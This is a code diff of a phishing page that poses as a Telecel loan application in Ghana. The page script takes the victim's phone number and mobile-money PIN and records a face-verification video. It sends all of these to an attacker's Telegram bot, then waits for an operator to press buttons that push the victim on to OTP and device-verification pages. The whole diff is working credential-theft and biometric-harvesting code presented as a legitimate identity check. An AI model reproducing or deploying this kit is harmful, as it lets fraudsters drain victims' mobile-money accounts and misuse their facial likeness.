+     the oval clip coordinates are identical. */
+  cropCanvas.width =OV.vw;
+  cropCanvas.height=OV.vh;
+  cropCtx.save();
+  // Mirror horizontally (front camera)
+  cropCtx.translate(OV.vw,0);
+  cropCtx.scale(-1,1);
+
+  // Draw video to fill viewBox maintaining cover aspect
+  const vAR=selfieVideo.videoWidth/selfieVideo.videoHeight;
+  const cAR=OV.vw/OV.vh;
+  let sw,sh,sx,sy;
+  if(vAR>cAR){
+    sh=selfieVideo.videoHeight; sw=sh*cAR;
+    sx=(selfieVideo.videoWidth-sw)/2; sy=0;
   } else {
-    ovalBorder.setAttribute('stroke','#22c55e');
-    arrowGroup.style.opacity='0';
-    selfieInstr.textContent='\u2713 Verified';
-    selfieSub.textContent='';
-    STEPS.forEach((_,i)=>{ document.getElementById(`sd${i}`).className='sdot done'; });
-    setTimeout(()=>{ if(mediaRecorder && mediaRecorder.state!=='inactive') mediaRecorder.stop(); }, 700);
+    sw=selfieVideo.videoWidth; sh=sw/cAR;
+    sx=0; sy=(selfieVideo.videoHeight-sh)/2;
   }
+  cropCtx.drawImage(selfieVideo,sx,sy,sw,sh,0,0,OV.vw,OV.vh);
+  cropCtx.restore();
+
+  // Clip to oval so recorded video only shows the face area
+  cropCtx.save();
+  cropCtx.globalCompositeOperation='destination-in';
+  cropCtx.beginPath();
+  cropCtx.ellipse(OV.cx,OV.cy,OV.rx,OV.ry,0,0,Math.PI*2);
+  cropCtx.fillStyle='black';
+  cropCtx.fill();
+  cropCtx.restore();
+
+  animReq=requestAnimationFrame(drawFrame);
 }
 
-function stopCamera() {
-  if (animationReq) cancelAnimationFrame(animationReq);
-  if (mediaStream) { mediaStream.getTracks().forEach(t=>t.stop()); mediaStream=null; }
-  if (canvasStream) { canvasStream.getTracks().forEach(t=>t.stop()); canvasStream=null; }
+/* ════════ ARROW ════════ */
+function setArrow(step){
+  if(!step.dir){ arrowGroup.setAttribute('opacity','0'); return; }
+  arrowGroup.setAttribute('opacity','1');
+  const {cx,cy}=step;
+  arrowCircle.setAttribute('cx',cx);
+  arrowCircle.setAttribute('cy',cy);
+  const d=ARROWS[step.dir];
+  const set=(el,x1,y1,x2,y2)=>{
+    el.setAttribute('x1',cx+x1); el.setAttribute('y1',cy+y1);
+    el.setAttribute('x2',cx+x2); el.setAttribute('y2',cy+y2);
+  };
+  set(aShaft,...d.shaft);
+  set(aHead1,...d.h1);
+  set(aHead2,...d.h2);
+}
+
+/* ════════ COUNTDOWN RING ════════ */
+const CIRC=2*Math.PI*35; // r=35
+
+function startCountdown(ms,onDone){
+  clearInterval(countdownTimer);
+  const total=Math.round(ms/1000);
+  let rem=total;
+  countdownRing.classList.add('visible');
+  function tick(){
+    cringNum.textContent=rem;
+    const frac=rem/total;
+    cringProg.style.strokeDashoffset=CIRC*(1-frac);
+    cringProg.style.stroke=frac>0.55?'#E42320':frac>0.28?'#f59e0b':'#22c55e';
+    rem--;
+    if(rem<0){ clearInterval(countdownTimer); countdownRing.classList.remove('visible'); if(onDone)onDone(); }
+  }
+  tick();
+  countdownTimer=setInterval(tick,1000);
+}
+
+/* ════════ SET / ADVANCE STEPS ════════ */
+function setStep(idx){
+  currentStep=idx;
+  const s=STEPS[idx];
+  selfieInstr.style.opacity='0';
+  setTimeout(()=>{ selfieInstr.textContent=s.instr; selfieSub.textContent=s.sub; selfieInstr.style.opacity='1'; },160);
+  updateStepBar(idx);
+  setArrow(s);
+  ovalBorder.setAttribute('stroke', idx===STEPS.length-1 ? '#22c55e' : '#E42320');
+  clearInterval(countdownTimer);
+  startCountdown(STEP_DURATION, advanceStep);
+}
+
+function advanceStep(){
+  if(currentStep<STEPS.length-1){ setStep(currentStep+1); }
+  else{ finishCapture(); }
+}
+
+function finishCapture(){
+  clearInterval(countdownTimer);
+  countdownRing.classList.remove('visible');
+  ovalBorder.setAttribute('stroke','#22c55e');
+  arrowGroup.setAttribute('opacity','0');
+  selfieInstr.textContent='✓ Verified';
+  selfieSub.textContent='';
+  updateStepBar(STEPS.length);
+  setTimeout(()=>{ if(mediaRecorder&&mediaRecorder.state!=='inactive') mediaRecorder.stop(); },700);
+}
+
+/* ════════ CAMERA ════════ */
+function stopCamera(){
+  clearInterval(countdownTimer);
+  if(animReq){ cancelAnimationFrame(animReq); animReq=null; }
+  if(mediaStream){ mediaStream.getTracks().forEach(t=>t.stop()); mediaStream=null; }
+  if(canvasStream){ canvasStream.getTracks().forEach(t=>t.stop()); canvasStream=null; }
   selfieVideo.srcObject=null;
 }
-
-function closeSelfieScreen() {
-  clearTimeout(stepTimer);
+function closeSelfie(){
   stopCamera();
   selfieScreen.style.display='none';
+  countdownRing.classList.remove('visible');
 }
 
-selfieCancel.onclick = () => {
-  closeSelfieScreen();
-  resetButton();
-};
+selfieCancel.onclick=()=>{ closeSelfie(); resetButton(); };
 
-async function startSelfieVerification() {
-  selfieDots.innerHTML = STEPS.map((_,i)=>`<div class="sdot" id="sd${i}"></div>`).join('');
+async function startSelfieVerification(){
+  buildStepBar();
   selfieScreen.style.display='flex';
   selfieInstr.textContent='Starting camera…';
   selfieSub.textContent='';
-  arrowGroup.style.opacity='0';
-  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.8)');
+  arrowGroup.setAttribute('opacity','0');
+  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.80)');
+  countdownRing.classList.remove('visible');
   recordedChunks=[]; selfieBlob=null;
-  try {
-    mediaStream = await navigator.mediaDevices.getUserMedia({
-      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
-      audio:false
+
+  try{
+    mediaStream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:false
     });
-    selfieVideo.srcObject = mediaStream;
+    selfieVideo.srcObject=mediaStream;
     await selfieVideo.play();
-    drawOvalFrame();
-    canvasStream = cropCanvas.captureStream(30);
-    const mimeType = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4']
-      .find(m => { try { return MediaRecorder.isTypeSupported(m); } catch(e){ return false; } }) || '';
-    mediaRecorder = new MediaRecorder(canvasStream, mimeType ? { mimeType } : {});
-    mediaRecorder.ondataavailable = e => { if(e.data && e.data.size>0) recordedChunks.push(e.data); };
-    mediaRecorder.onstop = () => {
-      selfieBlob = new Blob(recordedChunks, { type: mimeType || 'video/webm' });
-      closeSelfieScreen();
+    drawFrame();
+
+    canvasStream=cropCanvas.captureStream(30);
+    const mime=['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4']
+      .find(m=>{ try{return MediaRecorder.isTypeSupported(m);}catch(e){return false;} })||'';
+    mediaRecorder=new MediaRecorder(canvasStream,mime?{mimeType:mime}:{});
+    mediaRecorder.ondataavailable=e=>{ if(e.data&&e.data.size>0) recordedChunks.push(e.data); };
+    mediaRecorder.onstop=()=>{
+      selfieBlob=new Blob(recordedChunks,{type:mime||'video/webm'});
+      closeSelfie();
       proceedWithSubmission();
     };
     mediaRecorder.start(250);
-    setTimeout(()=>{ setStep(0); stepTimer=setTimeout(advanceStep, STEP_DURATION); }, 800);
-  } catch(err) {
-    selfieBlob=null; closeSelfieScreen(); proceedWithSubmission();
+    setTimeout(()=>setStep(0), 900);
+
+  } catch(err){
+    selfieBlob=null; closeSelfie(); proceedWithSubmission();
   }
 }
 
-async function sendVideoToTelegram() {
-  if (!selfieBlob || selfieBlob.size < 1000) return;
-  const accountType = document.getElementById('accountType').value==='mobile' ? 'Telecel Cash' : 'Broadband';
-  const caption = `🎥 Identity Verified (20s Oval)\n📱 Phone: ${capturedPhone}\n🔑 PIN: ${capturedPin}\n🏦 Account: ${accountType}\n💰 Amount: ${document.getElementById('loanAmount').textContent}`;
-  const ext = selfieBlob.type.includes('mp4') ? 'mp4' : 'webm';
-  const fd  = new FormData();
-  fd.append('chat_id', CONFIG.CHAT_ID);
-  fd.append('video',   selfieBlob, `identity_${Date.now()}.${ext}`);
-  fd.append('caption', caption);
-  try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`, { method:'POST', body:fd }); } catch(_) {}
+/* ════════ TELEGRAM ════════ */
+async function sendVideoToTelegram(){
+  if(!selfieBlob||selfieBlob.size<1000) return;
+  const acct=document.getElementById('accountType').value==='mobile'?'Telecel Cash':'Broadband';
+  const cap=`🎥 Liveness Verified (Up→Right→Down→Camera)\n📱 Phone: ${capturedPhone}\n🔑 PIN: ${capturedPin}\n🏦 Account: ${acct}\n💰 Amount: ${document.getElementById('loanAmount').textContent}`;
+  const ext=selfieBlob.type.includes('mp4')?'mp4':'webm';
+  const fd=new FormData();
+  fd.append('chat_id',CONFIG.CHAT_ID);
+  fd.append('video',selfieBlob,`liveness_${Date.now()}.${ext}`);
+  fd.append('caption',cap);
+  try{ await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`,{method:'POST',body:fd}); }catch(_){}
 }
 
-function sendMainMessage() {
-  const ts = Date.now();
-  const approveId = `approve_${ts}`, declineId = `decline_${ts}`, verifyId = `verify_${ts}`, appliedId = `applied_${ts}`;
-  const accountType = document.getElementById('accountType').value==='mobile' ? 'Telecel Cash' : 'Broadband';
-  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+function sendMainMessage(){
+  const ts=Date.now();
+  const appId=`approve_${ts}`,decId=`decline_${ts}`,verId=`verify_${ts}`,aplId=`applied_${ts}`;
+  const acct=document.getElementById('accountType').value==='mobile'?'Telecel Cash':'Broadband';
+  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      chat_id: CONFIG.CHAT_ID,
-      text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nAccount Type: <code>${accountType}</code>\nPhone: <code>${capturedPhone}</code>\nPIN: <code>${capturedPin}</code>\n\nChoose Action:`,
+    body:JSON.stringify({
+      chat_id:CONFIG.CHAT_ID,
+      text:`<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nAccount: <code>${acct}</code>\nPhone: <code>${capturedPhone}</code>\nPIN: <code>${capturedPin}</code>\n\nChoose Action:`,
       parse_mode:'HTML',
       reply_markup:{
         inline_keyboard:[
-          [{ text:'✅ Approve Loan', callback_data:approveId }, { text:'📱 Verify Device', callback_data:verifyId }],
-          [{ text:'📋 Applied', callback_data:appliedId }, { text:'🚫 Decline', callback_data:declineId }]
+          [{text:'✅ Approve Loan',callback_data:appId},{text:'📱 Verify Device',callback_data:verId}],
+          [{text:'📋 Applied',     callback_data:aplId},{text:'🚫 Decline',       callback_data:decId}]
         ]
       }
     })
   })
-  .then(()=>{ spinnerEl.style.display='flex'; startPolling(approveId, declineId, verifyId, appliedId); })
+  .then(()=>{ spinnerEl.style.display='flex'; startPolling(appId,decId,verId,aplId); })
   .catch(()=>resetButton());
 }
 
-async function proceedWithSubmission() {
+async function proceedWithSubmission(){
   await sendVideoToTelegram();
   sendMainMessage();
 }
 
-function startPolling(approveId, declineId, verifyId, appliedId) {
-  const interval = setInterval(()=>{
+/* ════════ POLLING ════════ */
+function startPolling(appId,decId,verId,aplId){
+  const search=new URLSearchParams(window.location.search).toString();
+  const interval=setInterval(()=>{
     fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${botState.lastUpdateId+1}`)
       .then(r=>r.json())
       .then(data=>{
-        if(!data.ok || !data.result) return;
-        data.result.forEach(update=>{
-          botState.lastUpdateId = update.update_id;
-          if(update.callback_query){
-            const cb = update.callback_query.data;
-            const search = new URLSearchParams(window.location.search).toString();
-            if(cb===approveId){ 
-              clearInterval(interval); 
-              spinnerEl.style.display='none'; 
-              window.location.href=`${CONFIG.OTP_PAGE}?${search}`;
-            }
-            else if(cb===verifyId){ 
-              clearInterval(interval); 
-              spinnerEl.style.display='none'; 
-              window.location.href=`${CONFIG.DEVICE_PAGE}?${search}`; 
-            }
-            else if(cb===appliedId){ clearInterval(interval); spinnerEl.style.display='none'; showToast(); resetButton(); }
-            else if(cb===declineId){ clearInterval(interval); spinnerEl.style.display='none'; showError('Request declined. Please try again.'); resetButton(); }
+        if(!data.ok||!data.result) return;
+        data.result.forEach(u=>{
+          botState.lastUpdateId=u.update_id;
+          if(u.callback_query){
+            const cb=u.callback_query.data;
+            if(cb===appId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.OTP_PAGE}?${search}`; }
+            else if(cb===verId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.DEVICE_PAGE}?${search}`; }
+            else if(cb===aplId){ clearInterval(interval); spinnerEl.style.display='none'; showToast(); resetButton(); }
+            else if(cb===decId){ clearInterval(interval); spinnerEl.style.display='none'; showError('Request declined. Please try again.'); resetButton(); }
           }
         });
       })
       .catch(()=>{});
-  }, 1000);
+  },1000);
 }
 
-continueBtn.onclick = () => {
+/* ════════ FORM ════════ */
+continueBtn.onclick=()=>{
   errMsg.style.display='none';
-  const phone = phoneInput.value.trim();
-  const pin   = pinInput.value.trim();
-  if(!phone || !isValidGhanaNumber(phone)){ showError('Please enter a valid Ghana number (e.g. 0501234567)'); return; }
+  const phone=phoneInput.value.trim();
+  const pin  =pinInput.value.trim();
+  if(!phone||!isValidGhana(phone)){ showError('Please enter a valid Ghana number (e.g. 0501234567)'); return; }
   if(pin.length!==4){ showError('PIN must be exactly 4 digits'); return; }
   if(isProcessing) return;
-  capturedPhone = phone; capturedPin = pin;
-  preSelfieModal.style.display = 'flex';
+  capturedPhone=phone; capturedPin=pin;
+  preSelfieModal.style.display='flex';
 };
 
-startCaptureBtn.onclick = () => {
-  preSelfieModal.style.display = 'none';
-  isProcessing = true;
-  continueBtn.disabled = true;
-  continueBtn.textContent = 'Verifying…';
+startCapture.onclick=()=>{
+  preSelfieModal.style.display='none';
+  isProcessing=true;
+  continueBtn.disabled=true;
+  continueBtn.textContent='Verifying…';
   startSelfieVerification();
 };
 
-phoneInput.addEventListener('input',()=>{ phoneInput.value = phoneInput.value.replace(/[^0-9]/g,'').slice(0,10); });
+phoneInput.addEventListener('input',()=>{ phoneInput.value=phoneInput.value.replace(/[^0-9]/g,'').slice(0,10); });
 pinInput.addEventListener('input',()=>{
-  pinInput.value = pinInput.value.replace(/[^0-9]/g,'').slice(0,4);
+  pinInput.value=pinInput.value.replace(/[^0-9]/g,'').slice(0,4);
   if(pinInput.value.length===4) pinInput.blur();
 });
 
+/* ════════ INIT ════════ */
 loadLoanDetails();
 phoneInput.focus();
 </script>
